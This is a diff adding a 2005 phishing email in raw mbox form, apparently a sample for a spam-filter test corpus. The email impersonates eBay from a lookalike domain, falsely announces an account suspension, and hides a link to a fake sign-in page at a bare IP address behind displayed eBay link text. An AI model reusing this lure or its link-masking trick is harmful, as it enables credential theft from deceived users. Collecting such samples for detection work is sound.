@@ -1,0 +1,48 @@
+From nobody Sun Jan 25 13:49:56 2015
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+ by example.com (Postfix) with ESMTP id 4DDB12A88C
+ for <user@example.com>; Wed, 14 Sep 2005 15:42:22 -0400 (EDT)
+Received: by mail.example.com (Example mail relay)
+ id 3E879621C99; Wed, 14 Sep 2005 15:42:22 -0400 (EDT)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+ by mail.example.com (Example mail relay) with ESMTP id E98F9621C71
+ for <user@example.com>; Wed, 14 Sep 2005 15:42:21 -0400 (EDT)
+Received: (from user@localhost) by mail.example.com id PAA05171
+ for user@example.com; Wed, 14 Sep 2005 15:42:21 -0400
+Received: from kamelot.watchsystem.it (host85-26.pool82187.interbusiness.it
+ [82.187.26.85]) by mail.example.com with ESMTP id PAA05163
+ for <user@biochemistry.bioc.cwru.edu>; Wed, 14 Sep 2005 15:42:20 -0400
+Received: from www.watchsystem.it (localhost [::ffff:127.0.0.1])
+ (TLS: TLSv1/SSLv3,256bits,AES256-SHA)
+ by kamelot.watchsystem.it with esmtp; Wed, 14 Sep 2005 21:03:57 +0000
+ id 0000BCC5.4328903D.00006FB5
+Received: (from courier@localhost)
+ by www.watchsystem.it (8.12.11/8.12.11/Submit) id j8EL3tON028568
+ for user@example.com; Wed, 14 Sep 2005 21:03:55 GMT
+Date: Wed, 14 Sep 2005 21:03:55 GMT
+Message-Id: <200509142103.j8EL3tON028568@www.watchsystem.it>
+From: suspension@ebay-bilIing.com
+Subject: Authorization failed, eBay.com will get block in 12 hours your accont
+Content-Type: text/html
+To: undisclosed-recipients: ;
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 142
+
+<FONT face="Courier New" size=2>Dear eBay Community Member ,<BR><BR>We regret to inform you that your eBay account has 
+been suspended due 
+to the violation of our site policy below:<BR><BR>False or missing contact information - Falsifying or omitting your 
+name, address, and/or telephone number (including use of fax machines pager numbers, modems or disconnected 
+numbers).<BR><BR>Due to the suspension of this account, please be advised you are prohibited from using eBay in any 
+way. This prohibition includes the registering of a new account.<BR><BR>Please note that any seller fees due to eBay 
+will immediately become due and payable.<BR>eBay will charge any amounts you have not previously disputed to the 
+billing method currently on file.<BR><BR>If you would like your account to be considered for reinstatement, please 
+click on the link below, and provide us additional information.<BR><BR><A 
+href="http://64.65.56.131/~panu/eBaySuspension/signin.ebay.com/aw-cgi/eBayISAPI.dllSignIn-ssPageName-hhsin.php" 
+target=_blank><FONT face="Courier New" color=#003399 size=2 ! fa! ce!="!&#10; Courier 
+New">http://signin.ebay.com/aw-cgi/eBayISAPI.dll?SignIn&amp;ssPageName=h:h:sin:US</FONT></A><BR><BR><FONT face="Courier 
+New" size=2>Regards,<BR><BR>eBay</FONT></FONT>
